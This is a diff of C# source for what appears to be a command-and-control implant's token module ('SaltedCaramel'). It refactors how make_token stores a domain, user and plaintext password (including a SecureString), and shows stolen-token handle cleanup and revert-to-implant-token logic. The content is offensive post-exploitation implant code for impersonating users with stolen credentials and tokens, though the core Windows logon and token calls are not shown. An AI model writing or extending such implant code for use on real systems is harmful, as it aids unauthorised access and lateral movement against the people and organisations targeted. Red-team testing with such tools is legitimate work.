@@ -7,10 +7,18 @@ using System.Security.Principal;
 
 namespace SaltedCaramel.Tasks
 {
+    public struct Credential
+    {
+        public string Domain;
+        public string User;
+        public string Password;
+        public SecureString SecurePassword;
+        public bool NetOnly;
+    }
     public class Token
     {
         public static IntPtr stolenHandle;
-        public static KeyValuePair<string, KeyValuePair<string, bool>> Credentials;
+        public static Credential Cred;
         // (username, (password, netonly))
 
         public static void Execute(SCTask task)
@@ -27,21 +35,38 @@ namespace SaltedCaramel.Tasks
 
         public static void MakeToken(SCTask task)
         {
-            string user = task.@params.Split(' ')[0];
-            string pass = task.@params.Split(' ')[1];
-            bool netonly = false;
+            string first = task.@params.Split(' ')[0];
+            if (first.Contains("\\"))
+            {
+                Cred.Domain = first.Split('\\')[0];
+                Cred.User = first.Split('\\')[1];
+            }
+            else
+            {
+                Cred.Domain = ".";
+                Cred.User = first;
+            }
+
+            Cred.Password = task.@params.Split(' ')[1];
+            Cred.SecurePassword = new SecureString();
+            // Dumb workaround, but we have to do this to make a SecureString
+            // out of a string
+            foreach (char c in Cred.Password)
+            {
+                Cred.SecurePassword.AppendChar(c);
+            }
+
+            Cred.NetOnly = false;
             if (task.@params.Split(' ').Length > 2)
             {
                 if (task.@params.Split(' ')[2] == "netonly")
-                    netonly = true;
+                    Cred.NetOnly = true;
             }
 
-            Credentials = new KeyValuePair<string, KeyValuePair<string, bool>>(user, new KeyValuePair<string, bool>(pass, netonly));
-
             task.status = "complete";
-            if (netonly)
-                task.message = $"Impersonated {user} (netonly)";
-            else task.message = $"Impersonated {user}";
+            if (Cred.NetOnly)
+                task.message = $"Successfully impersonated {Cred.User} (netonly)";
+            else task.message = $"Successfully impersonated {Cred.User}";
         }
 
         public static void StealToken(SCTask task)
@@ -132,9 +157,9 @@ namespace SaltedCaramel.Tasks
                 Win32.Kernel32.CloseHandle(stolenHandle);
                 stolenHandle = IntPtr.Zero;
             }
-            else if (Credentials.Key != null)
+            else if (Cred.User != null)
             {
-                Credentials = new KeyValuePair<string, KeyValuePair<string, bool>>(null, new KeyValuePair<string, bool>(null, false));
+                Cred = new Credential();
             }
         }
 
@@ -145,9 +170,9 @@ namespace SaltedCaramel.Tasks
                 Win32.Kernel32.CloseHandle(stolenHandle);
                 stolenHandle = IntPtr.Zero;
             }
-            else if (Credentials.Key != null)
+            else if (Cred.User != null)
             {
-                Credentials = new KeyValuePair<string, KeyValuePair<string, bool>>(null, new KeyValuePair<string, bool>(null, false));
+                Cred = new Credential();
             }
             task.status = "complete";
             task.message = "Reverted to implant primary token.";
